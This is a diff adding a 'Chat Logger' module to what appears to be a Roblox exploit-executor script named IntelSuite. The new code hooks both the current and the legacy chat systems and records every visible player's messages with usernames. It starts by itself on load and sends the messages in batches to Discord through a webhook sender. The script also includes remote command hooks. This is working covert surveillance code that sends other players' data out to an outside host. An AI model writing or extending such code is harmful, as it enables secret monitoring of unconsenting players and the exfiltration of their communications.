@@ -808,3 +808,86 @@ end
 task.wait(4)
 runInventoryCheck()
 getgenv().IntelSuite.InventoryCheck = runInventoryCheck
+
+-- ============================================================
+-- MODULE 13: Chat Logger
+-- Hooks TextChatService (new) + legacy chat
+-- Logs all visible chat messages to Discord in real time
+-- Also available via !cmd chatlog
+-- ============================================================
+local function startChatLogger()
+    if getgenv().IntelSuite.ChatLogActive then return end
+    getgenv().IntelSuite.ChatLogActive = true
+
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local chatBuffer = {}
+    local lastSend = os.time()
+
+    local function flushChat()
+        if #chatBuffer == 0 then return end
+        local msg = table.concat(chatBuffer, "\n")
+        chatBuffer = {}
+        send("CHAT LOG", msg:sub(1, 1900), 16753920)
+    end
+
+    -- Hook TextChatService (new Roblox chat system)
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService and TextChatService.MessageReceived then
+            TextChatService.MessageReceived:Connect(function(msg)
+                if not getgenv().IntelSuite.IsActive then return end
+                local sender = "Unknown"
+                pcall(function()
+                    if msg.TextSource then
+                        local p = Players:GetPlayerByUserId(msg.TextSource.UserId)
+                        if p then sender = p.Name end
+                    end
+                end)
+                local line = "[" .. sender .. "]: " .. tostring(msg.Text)
+                table.insert(chatBuffer, line)
+                if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
+                    lastSend = os.time()
+                    flushChat()
+                end
+            end)
+        end
+    end)
+
+    -- Hook legacy chat system
+    pcall(function()
+        local chat = game:GetService("Chat")
+        if chat then
+            Players.PlayerAdded:Connect(function(p)
+                p.Chatted:Connect(function(msg)
+                    if not getgenv().IntelSuite.IsActive then return end
+                    local line = "[" .. p.Name .. "]: " .. tostring(msg)
+                    table.insert(chatBuffer, line)
+                    if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
+                        lastSend = os.time()
+                        flushChat()
+                    end
+                end)
+            end)
+            -- Hook existing players
+            for _, p in ipairs(Players:GetPlayers()) do
+                p.Chatted:Connect(function(msg)
+                    if not getgenv().IntelSuite.IsActive then return end
+                    local line = "[" .. p.Name .. "]: " .. tostring(msg)
+                    table.insert(chatBuffer, line)
+                    if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
+                        lastSend = os.time()
+                        flushChat()
+                    end
+                end)
+            end
+        end
+    end)
+
+    send("CHAT LOGGER", "Chat logger active. Messages will be sent in batches of 10 or every 10 seconds.", 16753920)
+end
+
+-- Start on load
+task.spawn(startChatLogger)
+getgenv().IntelSuite.ChatLogger = startChatLogger
+
